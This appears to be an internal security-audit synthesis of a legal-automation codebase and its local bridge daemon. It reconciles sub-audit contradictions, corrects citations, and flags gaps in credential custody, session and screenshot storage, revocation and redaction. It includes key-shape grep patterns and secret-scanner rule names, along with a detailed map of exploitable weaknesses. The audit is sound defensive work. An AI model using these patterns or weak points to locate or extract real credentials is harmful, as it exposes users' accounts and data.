A live Playwright storageState - credential-equivalent by the session-blob rule - is written unencrypted into the repo working tree by the standard local verification workflow (.walkthrough/auth.json, documented as carrying the dashboard ekoa_token on both origins). Gitignored, not encrypted, no lifecycle. Also: playwright.config.ts sets trace:'on-first-retry' for an e2e estate that drives a real logged-in session, so a retried spec writes a trace containing that session's cookies and network into test-results/ with no scrubbing.

- `.gitignore:48`
- `.walkthrough/notes.md:19`
- `.walkthrough/notes.md:46`
- `playwright.config.ts:21-24`

---

## Cross-audit contradictions and how they were resolved

- D1(e) claims 'value-based masking runs ONLY inside the user-defined HTTP integration executor; nothing masks the automation engine's step outputs by VALUE'. D3, D4, D7 and D1's own verifier all show the automation engine's api_call executor does exactly that (api/src/automation/executors/api-call.ts:106-121, 169-177, 238-263). RESOLVED against D1: two divergent private COPIES of a value-based masker exist, neither shared nor reachable from anywhere else. D1's citation set for that element never opened api-call.ts at all.
- D2 and D3 both assert ekoa-bridge has no browser capability ('src/tools/ is filesystem-only', 'the ekoa-bridge repo has no browser capability at all'). D7's verifier and my own read show /Users/ggomes/Projects/ekoa-bridge/src/tools/tier2/browser.ts:29-56 implements a Playwright `browse()` returning up to 100 KB of document.body.innerText, registered in tier2Registry (index.ts:22-27) and ledgered (ledger.ts:82). RESOLVED against D2/D3 on the fact; their operative conclusion survives because it is ADR-002-gated off, has zero callers, and is structurally unreachable from the file-tier delegation schema.
- D3's summary states 'nothing in either repo ever persists a Playwright storageState'. Its own verifier found .walkthrough/auth.json (.gitignore:48, .walkthrough/notes.md:19,46) and the bridge's plaintext access/refresh tokens. RESOLVED: only the SCOPED claim holds - no PRODUCT code path persists a browser session. The unscoped sentence must not travel downstream.
- D2 lists 'revocation is terminal and preserved across re-register' as a STRENGTH and its crossCuttingRisks treat the revoke kill switch as load-bearing. Its verifier and my own grep show revokePairing (api/src/bridge/registry.ts:203) is called ONLY from api/tests/* - no route, service or UI - and the daemon's unpair is local-only. RESOLVED against D2: the kill switch is unreachable; a compromised machine cannot be cut off except by deactivating the whole account.
- D2 calls tenant binding 'the one genuinely conforming part' of the registry and D5's element (d) note calls the bridge plane's org derivation 'genuinely structural'. D5's verifier and my own read of api/src/bridge/delegation.ts:114 show delegateToLocal calls getConn(actor.userId) with NO expectedOrg and DelegationActor has no orgId field, so the task's org is ADOPTED from whatever connection resolves. RESOLVED: org binding is structural on the connect/provider path, adopted-not-checked on the delegation dispatch path, and the registry is per-USER not per-tenant (no org-scoped listing exists).
- D5 grades the router 'absent / build-fresh'; its own verifier shows setDelegateToLocal IS wired at api/src/server.ts:329, reachable as an agent tool, and mints a signed task PINNED to a resolved pairing with org, pairingId, grantRefs, a finite egressBytes budget, an expiry and a nonce under signature. RESOLVED against D5: diverges / close-gaps. 'Absent' would have told the build plan to discard a working signed pairing-bound task shape that already satisfies three of the four target declaration fields. D5's separate 'routing is not even wired' claim is true only of the automation browser seam.
- D4 grades the bridge registry as having no machine identity and 'no health beyond ping/pong liveness'; D2 and its verifier show LiveConnection carries pairingId, org, ownerUserId, alive and lastSeenAt. RESOLVED against D4: weak self-asserted machine identity and binary health DO exist; only the capability list, capability grants, allowlist and invocation audit are absent. Scope the build accordingly.
- D5 (and D3's crossCuttingRisks) claim a 'silent datacenter fallback' - 'a run intended to leave from a residential IP will silently leave from the datacenter IP'. D5's verifier shows localBrowserEnabled defaults to !isProd (api/src/automation/config.ts:38-41), so in production with no daemon the run HALTS in awaiting_daemon. RESOLVED against D5: the defect is that the flag is global and undeclarable per run, not that production silently falls back today.
- D7's central recommendation rests on 'ekoa-code sends no DOM to the model on the hot path', so 'a DOM-level username mask would protect a payload that does not exist'. Its verifier and my read of api/src/automation/executor.ts:287-299 show a live in-process DOM-text path: assertion failures embed 200 chars of live innerText and the raw URL into an Error that reaches the fixer LLM, the SSE stream and the persisted step record. RESOLVED against D7's premise: a bounded but real DOM-text plane exists and needs the value-keyed filter. D7's conclusion about not masking IDENTITY still stands on its own merits.
- D1's element (a) note asserts 'the only secret that crosses the socket is the daemon's OWN bridge token' (echoed in D2's element (a)). D2's verifier and my read of /Users/ggomes/Projects/ekoa-bridge/src/engine/engine.ts:184-205 show raw file excerpts are concatenated verbatim into the provider_request body with the comment 'The excerpts cross Boundary 1 here'. RESOLVED against D1/D2: file CONTENT crosses the socket into the model, with no secret detection and no sensitive-file denylist in the containment resolver.
- D5 states the hosted default onLedgerRow 'drops them hosted-side'. Its verifier and api/src/server.ts:1015-1020 show production OVERRIDES the default with bufferLedgerRow into a 15-minute TTL buffer. RESOLVED against D5: 'never PERSISTED, TTL-bounded display metadata only' - the divergence survives but must not be argued from a default production does not use.
- D4 states the interpolated argv is persisted in the approved_commands shape row (api/src/automation/consent.ts:33-41). Its verifier shows that row stores {_id, userId, shape, createdAt} - the NORMALIZED shape. RESOLVED against D4, re-scoped: computeCommandShape embeds the FULL interpolated script for the bash -c family and normalizeArg keeps non-path literals verbatim, so a secret in a bare argv literal or a bash -c body IS written there in cleartext with no TTL and no revocation on rotation.
- D3's element (a) says session capture is 'explicitly NOT implemented'; D6 documents a shipped CITIUS integration asset whose authType is browser_session and whose credentialGuide promises the user 'O Ekoa captura a sessão autenticada (cookies) e guarda-a cifrada'. Both are true and the combination is the finding: the shipped asset advertises a capability that api/src/routes/integrations.ts answers available:false / started:false, and the encrypted-storage promise is false in either direction.
- D7 grades redaction of the vision payload 'absent / build-fresh'; its verifier shows the prompt and systemPrompt half of that same payload IS anonymised at the chokepoint (api/src/llm/client.ts:967-968) and three value-keyed redactors sit on adjacent legs. RESOLVED against D7: diverges / close-gaps - the seam exists, the work is extending it to the pixel plane.

---

## Discarded and re-scoped claims

Claims whose cited evidence did not exist or did not say what was asserted. Listed so they are not silently carried forward.

- D1 (i) - ekoa-bridge/src/ledger/ledger.ts:25-45 cited as the bridge's COMPLETE record family ('read rows, denials, write-backs and cap-consents'). That range covers ReadLedgerRow (25-30) and DenialLedgerRow (32-43) only. WriteLedgerRow is 45-58, CapConsentLedgerRow 60-70, and AutomationLedgerRow - the row that records the full bash command line and browser navigation target - is 72-89 and was omitted from both the citation and the analysis. Element verdict retained because I re-read ledger.ts:72-99 and shared/src/registo.ts:15-23 myself.
- D1 (h) - shared/src/events.ts:163 cited for the relay / attended-pause element. Lines 162-168 are the `awaiting_consent` event, which belongs to element (g). pause_for_user is :147-154 and streaming_available is :156-161; neither was cited. Verdict retained on the verifier's independent evidence.
- D1 (d) - api/src/automation/executor.ts:207-215 cited to show 'press/submit is a SEPARATE action'. The `press` case is 199-207; 208-215 are `select` and `check`. Claim true, range wrong. Replaced with executor.ts:199-207.
- D1 (j) - deploy/api.service.json:8 asserted as 'the sole mention' of Secret Manager. False: at least ten other references exist, including a CI gate that fails the build on a secret-shaped literal (deploy/validate-topology.sh:34,44) and a written prod-custody posture (docs/security.md:283). The 'absent / RETIRE' verdict survives; the assertion built on the citation does not, and it inverts the governance consequence (the Cofre's Secret-Manager-ruled-out decision now contradicts a written doc).
- D1 (e) - api/src/integrations/http-template.ts:122-131 cited for a divergence whose scope spans two functions; the URL variant is :108-119. Minor, but the bullet's scope claim cites only one.
- D4 - api/src/automation/consent.ts:33-41 cited as persisting the INTERPOLATED argv. It persists the normalized shape. Re-scoped (see contradictions), not dropped.
- D4 - api/src/automation/engine.ts:768 cited as the hand-off of the stderr-bearing failure message into the fixer prompt. Line 768 is inside emit?.runPatch(...), the SSE progress event. The hand-off is 784-795. Both exist and read the same field, so the finding is stronger, not weaker.
- D5 - api/src/automation/local-browser-session.ts:96-98 cited as evidence that browsers are launched headless with no proxy. Those lines are the constructor; that file never launches a browser (it consumes an injected context from server.ts:461-464).
- D5 - shared/src/ekoa-local.ts:224 cited as a frame member; it is the comment `// daemon -> hosted`.
- D5 - api/src/data/store.ts:19-24 cited as 'the bare Store class'; line 19 is a constant, the class is at 20. Off-by-one, range still contains the claim.
- D5 - element (c) divergence #3's central factual claim (the unauthenticated /automation-screenshots mount) carries NO path:line in that element's evidence array. The claim is true (api/src/server.ts:920; docs/decisions.md:20) and is re-cited here, but as filed it was an uncited assertion in a review demanding file:line evidence.
- D3 - api/src/services/browser-pool.ts:31 cited as chromium.launch({headless:true}); line 31 is the dynamic import, the launch is line 32. Claim correct.
- D7 - api/assets/integrations/citius/config.json:13 cited as carrying the credentialGuide quote 'são apenas configuração, não são segredos'. I verified: line 13 is "errorUrlContains": "/error"; the quote is at line 16. MATERIAL because it is the load-bearing quote of the element.
- D7 - 'ekoa-bridge src/tools/ is filesystem-only / no browser capability at all', uncited and false (src/tools/tier2/browser.ts:29-56, index.ts:22-27). Same false claim appears in D2 and D3.
- D7 - api/src/llm/client.ts:969-970 cited for the anonymize() calls; I verified they are at 967-968 (969 is a comment, 970 is runSandbox()). The evidence-array range 958-1002 covers it.
- D7 - docs/security.md:76 cited for 'collect all model-bound TEXT'; line 76 is blank, the sentence is at :77.
- D7 - api/src/automation/persistence.ts:97-98 cited as the disk-path→URL mapping; those are the docblock tail and signature, the expression is at :100. And run-events.ts:41 cited for the screenshotUrl spread, which is at :40.
- D7 - api/src/automation/executors/api-call.ts:237-256 / 237-246: collectSecretValues is 238-247 and redactSecretValues 250-256. Content accurate, heads off by one.
- D6 IN ITS ENTIRETY is UNVERIFIED - it is the only audit with `verification: null`, and its central findings (mTLS-only mandatário access, non-resolving IRN hostnames, the OA Roundcube form login, the civilonline captcha) rest on live network probes that cannot be re-checked from code and that I did not attempt. Its CODE-side claims I did verify and they hold (config.ts:230-232 base URLs, portal-connectors.ts:124-128 URL shape, citius config.json authType/credentialGuide, the non-functional IMAP transport, zero cidnews hits). Treat every rail conclusion as a hypothesis requiring a re-probe before it is budgeted.

---

## Open questions carried out of the gate

- Where does the Cofre live in the module tier table? api/src/automation/ may not import api/src/integrations/ (the credential loader is an injected seam at automation/seams.ts:137-153), so a store needing data/ + a policy seam + consumers in automation/, integrations/ and bridge/ either becomes a new top-level module with its own seam or lives under data/. Unresolved, and FIXED-12 means docs/diagrams/02-module-map.excalidraw must be updated in the same unit of work - no audit opened it.
- Is the storage target the Firestore native SDK or the current Mongo-compat driver? api/src/data/mongo.ts:2-7 says production points the `mongodb` driver at Firestore Enterprise. A KMS envelope layer is agnostic, but 'ciphertext in Firestore' plus any Firestore-native rule/IAM assumption in the Cofre design must be confirmed against this driver.
- docs/security.md:283 already commits to 'Secret Manager in prod; a bootstrap-generated key in dev; rotation documented per secret', and deploy/validate-topology.sh is a CI gate enforcing that posture. The Cofre's 'one KMS key per environment, Secret Manager ruled out as primary backend' decision contradicts a written doc. Which supersedes, and does the CI gate need changing?
- Which of the credential boundaries the plan intends to LEAN on are actually covered by a named security-suite regression test? No audit opened api/tests/ or SUITE_LEDGER.json. Per the verdict rules an untested seam downgrades, and that rule was never applied to scrubCredentials, the template-vars redaction, redactSecretsDeep or the api-call masker.
- Is DaemonBrowserSession / the runStep seam kept or retired? It is fully written, exercised by tests, unwired in production, and its committed design sends browser screenshots + DOM over the control socket - which the target data-plane rule forbids. Keeping it means scoping the rule to raw egress only; retiring it means the cloud browser proxies through the machine instead. The choice determines whether the bridge needs a 'browser' capability at all.
- How is `signingSecret` intended to reach a production bridge? Nothing writes it, no ekoa-code endpoint mints one, and an empty value denies every delegation as 'bad signature'. Is chat-driven file delegation functional outside the integration harness, or has it only ever run with a hand-copied JWT_SECRET? ekoa-bridge/docs/decisions.md:26-29 flags the per-pairing mint as an ekoa-code change that was never made.
- Is the provider_request/provider_response reverse LLM-proxy family intended to survive into protocol v2? It is not among the six target families but it is the mechanism that keeps the egress chokepoint intact for bridge traffic; dropping it needs a replacement story.
- Does the Cortex chokepoint PERSIST bridge-forwarded prompt bodies (via proxyGatewayMessages or the anon-audit)? That determines whether bridge-sourced file excerpts become an at-rest exposure under I2/I4 or only a transit one. Not examined by any audit.
- Where is the Mac Mini residential proxy actually configured? Provably not in either repo (no proxy option on any chromium.launch, zero residential/tailnet hits). If it runs in production it is an out-of-band infrastructure setting with no application-side hook - which would mean the 'generalization' has nothing to generalize from.
- What is CidNews? Zero hits in either repo and no publicly findable Portuguese legal service by that name. Get the URL and a login-screen screenshot from the pilot lawyer before budgeting anything.
- Can the OA professional certificate satisfy a TLS client-certificate challenge as exportable key material, or is it card/mID-app-bound only - and does an eTribunal session, once established with the card, survive as a cookie-only storageState transplanted to another machine? These two probes decide whether the bridge is a login helper or a full execution target for the whole eTribunal lane, and therefore the shape of session.push. D6 could not answer either.
- Does any deployed environment set EKOA_AUTOMATION_LOCAL_BROWSER=true? If so the never-closed-BrowserContext and unauthenticated-screenshot findings apply in production, not just dev.
- Is there any deletion, TTL or pruning job for <dataDir>/automation-runs/**/step-N.png? Every reference in api/src is a write or a path builder; no unlink or sweeper was found, and stale pre-rebuild PNGs are still being served. Confirm absence and decide a retention policy - it is a GDPR erasure obligation over an unindexed PNG tree.
- Does the LLM provider contract (ZDR / no-training / processor terms) cover the Agent SDK subprocess route used by runOneShot? The GDPR defensibility of sending unmasked court-portal screenshots depends on it, and no DPA/ZDR posture is referenced in docs/security.md.
- Is the certificate-identity pointer type in scope for v1, and how does it relate to the existing Zoho/Adobe Sign provider credentials that currently sit in the same credentialsCiphertext bundle? I7 has no representation anywhere and no audit gave it a verdict.

---

## Gate self-audit: what the seven audits missed

Verdict on the gate: **the synthesis is good at re-reading files the sub-audits cited and bad at noticing files nobody cited.** Every correction it makes is downstream of an existing citation. Its coverage claim ("Cofre UI absent", "no credential item lifecycle", "no masking surface", "no registo credential events") is contradicted by shipped, navigable, e2e-tested code in `web/app/(dashboard)/settings/` and `api/src/auth/` that appears in **zero** of the eight documents.

---

## P0 - The gate cited the exact lines that disprove its own headline

### 1. `web/lib/navigation.ts:49-90` was cited for "no Cofre entry" and never read

Element (f) verdict `absent / build-fresh / large`, evidence `web/lib/navigation.ts:49-90`. Those lines contain:

- `web/lib/navigation.ts:67-73` - `{ href: "/settings/privacy", label: "Privacidade e ponte local", bottom: true }`
- `web/lib/navigation.ts:75-81` - `{ href: "/settings/api-keys", label: "Chaves de API", bottom: true }`

Two credential/privacy left-menu items exist. The verdict is wrong as filed and the effort estimate is wrong with it.

**Follow-up:** re-verdict (f) after reading `web/app/(dashboard)/settings/privacy/page.tsx:47-53`, which composes `BridgeInstallSection`, `BridgeStatusSection`, `GrantsSection`, `LedgerSection`, `MaskingSummarySection`, `ApprovedCommandsSection`. That is a shipped grants + ledger + masking + approved-commands surface - the Cofre's structural sibling. `diverges/close-gaps`, not `absent/build-fresh`.

### 2. An entire privacy UI area, plus its e2e spec, is invisible to the gate

Never opened by anyone:
- `web/components/privacy/settings/grants-section.tsx`, `ledger-section.tsx`, `masking-summary-section.tsx`, `approved-commands-section.tsx`, `bridge-status-section.tsx`, `bridge-install-section.tsx`
- `web/components/privacy/first-grant-dialog.tsx`, `file-browser-dialog.tsx`, `trust-chip.tsx`, `gated-claim.tsx`
- `web/e2e/privacy-grants-ledger.spec.ts:1-18` - a deterministic spec asserting *"the live grants list renders with revoke wired… the registo defaults to the ALL-SESSIONS view… a daemon WITHOUT the C3 endpoints yields the honest unavailable state"*

The gate says "grant" in this codebase only means a filesystem directory pre-authorisation. True - but there is a **shipped grants list with revoke, an egress ledger view, and an honest-unavailable state**, all e2e-pinned. That is the grant UI pattern to extend, and the gate told the build plan it does not exist.

### 3. A complete, shipped credential lifecycle exists in `api/src/auth/gateway-keys-service.ts` - cited by nobody

`api/src/auth/gateway-keys-service.ts:1-14` and `:52-133` implement, today:

| Cofre requirement the gate called absent | Already shipped |
|---|---|
| item mint, plaintext returned once, never stored | `:52-69` (`mintGatewayKey`, sha256 as `_id`) |
| per-item **last-used** | `:117-124` (throttled `lastUsedAt` write) |
| per-item **revoke ("Bloquear agora")**, idempotent, no cross-user oracle | `:95-103` (`revokeGatewayKey`) |
| **fail-closed admission** (unknown/revoked/inactive/billing-locked) | `:108-116` |
| **per-credential caps/scope** | `GatewayKeyVerdict.caps { maxCallsPerWindow, maxSpendPerWindow }`, `:34-37` |
| **registo events for credential lifecycle** | `logActivity(actor,'security','gateway_key_minted'\|'gateway_key_revoked')`, `:67`, `:100` |
| the UI (mint/list/copy-once/revoke/confirm) | `web/app/(dashboard)/settings/api-keys/page.tsx:17-22` + `web/e2e/gateway-keys.spec.ts` |

The gate's element (i) asserts *"none of the eleven Cofre events exist"* and its verdict (f) says there is no last-used and no lock-now. Both statements are true of *the Cofre* and false of *the codebase*, and the difference is the entire v1 build plan.

**Follow-up:** re-scope (b), (f), (i) to "generalize gateway-keys' item lifecycle to a typed item model", not build-fresh. Effort drops from large to medium on the UI and the event plumbing.

---

## P1 - Subsystems that obviously bear on the rubric and were never opened by anyone

I went and looked. These have **zero citations across all eight documents**:

**Credential custody / OAuth (I4, I6, I7, item type "OAuth token (refresh)")**
- `api/src/integrations/platform-oauth.ts:1-10` - 591 lines: *"Token custody - the encrypted-at-rest OAuth token bundle… `getValidPlatformTokens` decrypts, refreshes-on-expiry, and re-persists (singleflight per row so a rotating refresh_token is never double-spent)"*. This IS a refresh-token custody + rotation primitive, and it is the item type the Cofre names. No verdict.
- `api/src/integrations/m365-proxy.ts:1-10` - *"forwards the Graph path verbatim, injecting a freshly-refreshed workspace Bearer token; the served app never sees the token"*, gated on a per-app manifest opt-in. That is the **closest shipped analogue of the I9 primitive** (fixed injector, caller sees only a reference). No verdict.
- `api/src/integrations/prefetch.ts:1-11` - OAuth-backed email/calendar/file content injected into the chat system prompt, cache keyed per-org. A live I1/I3 surface. No verdict.
- `api/src/integrations/app-sso.ts`, `app-sso-sessions.ts:1-8`, `app-scope.ts`, `sign-agreements.ts`, `zoho-sign.ts`, `adobe-sign.ts`. The gate dismissed `sessions`/`app_sessions` as "platform/SSO sessions, not browser sessions" **without opening the module**; `app-sso-sessions.ts` is a session store whose isolation is *"enforced server-side by `session.appId === <canonical id>`, never by cookie path"* - exactly the tenancy claim the gate's element (d) is about.
- `api/src/routes/credentials.ts:1-6` + `shared/src/credentials.ts:1-5` - a **write-only, never-echoed, super-admin, audit-logged** credential provisioning contract. The Cofre's write path pattern already exists and is in the zod contract.
- `api/src/routes/gateway-keys.ts`, `shared/src/gateway-keys.ts`, `web/stores/gateway-keys.ts`.
- `api/src/routes/pipedream.ts:1-15` + `api/src/integrations/pipedream.ts` - third-party credential brokering (Connect tokens, connected accounts). An external credential-custody plane with no verdict.

**Revocation / replay (element (b) auth model)**
- `api/src/auth/revocation.ts:14-39` - a durable, boot-loaded, O(1)-checked `jti` revocation set backed by `revoked_tokens`. The gate correctly says bridge tokens carry no `jti` and never consult it, but never noticed **the plane already exists**. That reframes the bridge-revocation gap from build-fresh to "mint bridge tokens with a jti and call `isRevoked`".
- `/Users/ggomes/Projects/ekoa-bridge/src/session/nonces.ts:1-8` - a check-then-record replay cache. The gate says "no replay store"; there is one, on the task path, unused on the connect path.

**Redaction / detection (element (e))**
- `api/src/services/commit-guard.ts:78-108` - a **high-precision 11-rule secret scanner** (`pem-private-key`, `provider-sk-key`, `stripe-key`, `aws-access-key`, `google-api-key`, `slack-token`, `jwt`, `credentialed-connection-string`, `assigned-secret`), findings *"never echo the secret value, only rule + path + line"*, wired to `logActivity` and blocking. This is the shape-based detector the "value-keyed masker" needs as its second leg, and nobody mentioned it.
- `scripts/gitleaks.toml`, `scripts/semgrep.yml`, `scripts/encryption-key-grep.sh:13`, `scripts/chokepoint-grep.sh`, `api/src/services/app-archive.ts`.
- `api/src/services/deny-list.ts` (the sole `encryptForScope` caller - the gate mentions the caller count but never opened the module).

**Anonymisation (the gate's own brief listed these as starting points; no verdict issued)**
- `api/src/llm/anonymise/vault.ts:1-13` - *"the value-to-token map is held in memory ONLY… NEVER written to disk or to any store… cleared on session end"*. This is a working **RAM-only, session-scoped, cleared-after-use** secret map - the closest thing in either repo to the I4 use-window discipline, and the gate's I4 breach says "zeroization does not exist" without acknowledging it.
- `api/src/llm/anonymise/audit.ts:1-14, :19-35` - a **metadata-only, hash-chained** audit with `classes`, `entityCount`, `payloadHash`, `denyListAccessed`, `refused`. Answers the gate's own openQuestion #8 ("does the chokepoint persist bridge-forwarded bodies?"): no - metadata only, by explicit design, folded into `logActivity`.
- `api/src/services/platform-crud.ts:258-265` + `api/src/routes/registo.ts:17-18` + `shared/src/registo.ts:59-61` - `GET /api/v1/registo/masking-summary`, a per-user aggregate over `category: 'anonymisation'` activity rows, rendered at `web/components/privacy/settings/masking-summary-section.tsx:24-32`. **A masking-activity registo class already exists and is on-screen.** Element (i)'s "the complete logged vocabulary" enumeration missed it a second time (the categories actually in use include `anonymisation`, `security`, `credential`, `auth`, `org`, `user`, `app`, `integration`, `session`).

**Other**
- `api/src/apps/backend-runtime/handle-rpc.ts:14-23, :90, :95` - a **capability-token** model: a short-lived JWT minted per invoke, `artifactId` fixed by the token, *"the worker holds NO DB credentials and NO OAuth tokens… core validates + EXECUTES every call core-side"*. That is precisely the I5 shape the Cofre needs (untrusted code names a reference; a fixed primitive executes). Never cited. It is also a **fourth consumer of `loadConfig().jwtSecret`**, strengthening the key-monoculture breach the gate filed with three.
- `api/src/events/webhook-verifiers.ts:1-5` - *"The secret is decrypted only at verify time by the caller and passed in as cleartext"*, timing-safe. A per-use decrypt discipline, unaudited.
- `api/src/security-headers.ts:1-24` - never opened despite being in my brief; relevant to the unauthenticated `/automation-screenshots` mount finding (that mount inherits `frame-ancestors 'self'`, not the API CSP).
- `api/src/services/{preview-token,safe-path,url-safety}.ts`, `api/src/knowledge/{vault,paths}.ts`, `api/src/events/listener-supervisor.ts` (**has uncommitted working-tree changes right now** and reaches integration credentials).
- ekoa-bridge, never cited: `src/wire/signing.ts:5-12`, `src/verify/verify-task.ts:1-12` (the ordered S2 gate - *the* existing enforcement seam a grant check would join), `src/session/egress.ts:1-12`, `src/auth/device-login.ts`, `src/auth/bridge-token.ts:1-11`, `src/surface/browse.ts:1-10`, `src/cli/commands/grant.ts`, `src/engine/task-program.ts:1-9`, and the whole `packaging/` installer set (`install.sh`, `install.ps1`, two double-clickable launchers) - the code that provisions a bridge on a user machine, i.e. the transit path for `signingSecret`.

---

## P2 - Target-architecture elements NO audit gave any verdict to

Enumerated against the rubric, these appear in no `correctedMatrix` row and no breach:

1. **I2's "analytics or error reports"** - nobody checked whether Sentry/telemetry/an error reporter exists at all. Unfalsified either way.
2. **Item type: TOTP seed** - zero coverage.
3. **Item type: software certificate** and **certificate identity (pointer)** - flagged as an openQuestion, never verdicted.
4. **Item type: OAuth token (refresh)** - verdicted only as "part of the credentialsCiphertext blob"; `platform-oauth.ts`'s real refresh/rotation/singleflight custody was never assessed.
5. **State "Em utilização" (live while an automation holds it)** - no verdict; there is no lease/holder concept anywhere and nobody said so.
6. **"Bloquear tudo" (global lock)** - named in the event list, never verdicted as a mechanism.
7. **"No usage-count locking"** - nobody checked whether any usage-count gate exists (it does, adjacently: `caps.maxCallsPerWindow` in gateway keys + `api/src/billing/rate-caps.ts`).
8. **"KMS default rotation, no custom rotation machinery"** - no verdict on whether custom rotation machinery exists today. `docs/security.md:283` says "rotation documented per secret"; `platform-oauth.ts` does perform rotation.
9. **"Parallel automations clone session state per context"** - only the never-closed-context defect was covered; the clone requirement itself got no verdict.
10. **Registo event "session established / refreshed / expired" shape parity with bridge events** - asserted absent, never checked against `activityLogs` category `session` (which exists: `audit(actor,'session','create'|'update'|'delete')` in `platform-crud.ts`).

---

## P3 - Claims in the gate resting on no evidence or on discarded evidence

- **"the eleven Registo events do not exist"** - contradicted by `security::gateway_key_minted`, `security::gateway_key_revoked`, `credential::set`, and the whole `anonymisation` category. Restate as "no *automation/browser-credential* events exist".
- **"there is no last-used, no lock-now"** (element f) - contradicted by `gateway-keys-service.ts:117-124, :95-103`.
- **"Cofre UI: absent"** - contradicted by two nav entries the gate itself cited.
- **"D1's element (a) unit of storage is an opaque configValues blob, no item type, no state, no last-used"** - true of `integrationConfigs`, false of `gatewayKeys` (`GatewayKeyDoc` has `label`, `secretHint`, `createdAt`, `revokedAt`, `lastUsedAt`, `caps`). The gate generalized from one store to "the codebase".
- **openQuestion #4 ("which boundaries have a named security-suite test?")** - I ran it. Answer below; it should not have shipped as an open question.
- **openQuestion #8 ("does the chokepoint persist bridge-forwarded bodies?")** - answerable from `llm/anonymise/audit.ts:1-14` (metadata only, hash-chained, no bodies). Should be closed.

---

## P4 - The secrets check nobody ran (I ran it)

**Committed files, both repos: clean.** No real key material in tracked content.

| Check | Result |
|---|---|
| Key-shape grep over all tracked files, ekoa-code (`sk-ant-*`, `sk-*`, `AKIA*`, `ghp_*`, `github_pat_*`, `xox[baprs]-*`, `AIza*`, PEM headers, JWT shape) | 1 hit: `api/tests/services/commit-guard.test.ts:83` - a synthetic `ghp_aaaa…` scanner fixture. Not a secret. |
| Same over ekoa-bridge tracked files | 0 hits |
| Git history, ekoa-code (512 commits), `-S` on `sk-ant-api03` / `AKIA` / `ghp_` / `xoxb-` / PEM | Hits are documentation and detector patterns only: `scripts/gitleaks.toml:11-12`, `scripts/semgrep.yml:21`, `api/src/services/commit-guard.ts:84`, `.claude/skills/run-ekoa-code/SKILL.md:71,73`, `deploy/staging/README.md:48,69`, `deploy/staging/provision.sh:85,111`, and prefix-only placeholders in `api/tests/journeys/boot-b.mjs`, `api/tests/llm/credentials.test.ts`, `api/tests/llm/agent-transport.test.ts`. No value-bearing key found. |
| Git history, ekoa-bridge (33 commits) | 0 hits on every pattern |
| Committed `.env` files, ever added, either repo | none |
| `deploy/staging/.env.example` | 8 vars (`PUBLIC_ORIGIN`, `PUBLIC_HOSTNAME`, `ACME_EMAIL`, `MONGO_PASSWORD`, `JWT_SECRET`, `ENCRYPTION_KEY`, `EKOA_ADMIN_USERNAME`, `EKOA_ADMIN_PASSWORD`). All secret values are 7-char uppercase placeholders (`AAAA_AA` pattern) with `# Generate each with openssl rand -hex 32` at line 24. Clean. |
| Untracked secret files on disk | Only `deploy/staging/.env.example`. **`.walkthrough/auth.json` does not currently exist** - the gate's low-severity finding is real as a workflow risk but there is no live artifact today. |
| Playwright traces / storageState blobs on disk | none (`test-results/` holds only `.last-run.json`) |
| `ekoa-data/` | 30 demo JSON files only, no credential material |
| `.playwright-cli/` | ~hundreds of real-dashboard PNGs on disk, **untracked** (`git ls-files .playwright-cli` = 0). Not committed, but they are the same unencrypted-screenshot-at-rest class as the gate's `/automation-screenshots` finding, in the repo working tree, with no retention. |
| Tracked ciphertext fixture | `api/scripts/migrate/fixtures/source/standalone_credentials.json` - one row, `{_id, mode, credentialCiphertext(166 chars)}`. Ciphertext, not plaintext - but it is a **committed ciphertext produced under the single global `ENCRYPTION_KEY`**, so its confidentiality is exactly as strong as that env var. Worth an explicit decision. |
| `docs/autothing/runs/**` | 274 tracked files of run artifacts including `codex-checkpoint-a-credential-authz.json`. Scanned clean of key shapes, but it is an unreviewed tracked corpus of security-review output. |

---

## P5 - The gate's own openQuestion #4, answered: every boundary the plan leans on is untested

`grep -rl` over `api/tests/` + `web/e2e/`:

| Boundary the gate praises or leans on | Test files referencing it |
|---|---|
| `scrubCredentials` | **0** |
| `redactSecretsDeep` | **0** |
| `collectSecretValues` | **0** |
| `redactSecretValuesIn` | **0** |
| `maskValue` | **0** |
| `decryptCredentialFields` | **0** |
| `resolveUserPath` (the unsandboxed file primitive) | **0** |
| `guardedFetch` | 1 real (`api/tests/integrations/docx-fetch.test.ts`) |
| `encryptForScope` | 1 (`api/tests/llm/anonymise-chokepoint.test.ts`) |

And `api/tests/SUITE_LEDGER.json` has **no security or privacy suite class at all** - its top-level keys are `playwright`, `frontend_unit`, `node_drivers`, `contract_tests_from_ruleset`, `module_tests_146`, `conditional_carryover_20`, `retired_by_design`, `mock_servers_and_fixtures`. `CLAUDE.md`'s QA process and the `ekoa-testing` skill mandate named security suite classes; none exist.

**Follow-up:** the gate's own verdict rule ("an untested seam downgrades") should be applied retroactively to every element whose note says "keep this boundary as-is" - that is `scrubCredentials`, the template-vars redaction, the api-call masker and the platform-primitives direct-ref refusal, all zero-coverage. And add the security suite class to `SUITE_LEDGER.json` before any Cofre work lands, or the same blind spot repeats.

---

## Prioritised follow-ups

1. **Re-run elements (b), (f), (g), (i) against `api/src/auth/gateway-keys-service.ts`, `api/src/auth/revocation.ts`, `web/app/(dashboard)/settings/{privacy,api-keys}/`, `web/e2e/{gateway-keys,privacy-grants-ledger}.spec.ts`.** Four verdicts and three effort estimates are wrong. This alone rewrites the v1 plan.
2. **Issue verdicts for the OAuth credential-custody plane** (`platform-oauth.ts`, `m365-proxy.ts`, `prefetch.ts`, `app-sso-sessions.ts`, `pipedream.ts`, `sign-agreements.ts`). It is live, holds refresh tokens, injects them into third-party calls, and pipes their content into the chat prompt. Zero of eight documents cover it. This is the largest unexamined credential surface in the repo.
3. **Verdict `api/src/apps/backend-runtime/handle-rpc.ts`** as the I5/I9 reference implementation, and add it to the JWT-secret monoculture breach as consumer #4.
4. **Close openQuestions #4 and #8 with the answers above**, and add a new one: does any error reporter/analytics SDK exist (I2 has never been tested against that clause)?
5. **Verdict the 10 P2 rubric elements** that no audit touched, especially "Em utilização", "Bloquear tudo", TOTP seed, and the no-usage-count-locking constraint (which `billing/rate-caps.ts` + gateway-key `caps` arguably already violate in spirit).
6. **Decide on `api/scripts/migrate/fixtures/source/standalone_credentials.json`** - a committed ciphertext under the global key - and on `.playwright-cli/` retention.
7. **Add the security suite class to `api/tests/SUITE_LEDGER.json` and write the missing tests** for the seven zero-coverage boundaries before treating any of them as load-bearing.
